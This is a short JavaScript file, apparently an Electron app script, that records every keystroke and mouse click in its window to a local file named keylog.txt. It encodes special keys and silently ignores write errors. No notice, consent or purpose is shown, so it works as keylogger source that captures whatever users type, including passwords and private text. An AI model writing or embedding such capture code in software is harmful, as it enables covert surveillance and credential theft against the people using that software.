const fs = require('fs')
const path = require('path')

const logpath = path.join(__dirname, 'keylog.txt')
let lastlogged = ''

window.addEventListener('keydown', (event) => {
  const key = event.key
  let entry = ''

  if (event.ctrlKey || event.metaKey) entry = '[ctrl]'
  else if (key.length === 1) entry = key
  else if (key === 'Enter') entry = '\n'
  else if (key === 'Backspace') entry = '[bksp]'
  else if (key === 'Tab') entry = '[tab]'
  else if (key === 'Escape') entry = '[esc]'
  else if (key === ' ') entry = ' '
  else if (key.startsWith('Arrow')) entry = key.replace('Arrow', '[').toLowerCase() + ']'
  else return

  try {
    fs.appendFileSync(logpath, entry)
  } catch (e) {}
})

window.addEventListener('click', () => {
  try {
    fs.appendFileSync(logpath, '[click]')
  } catch (e) {}
})
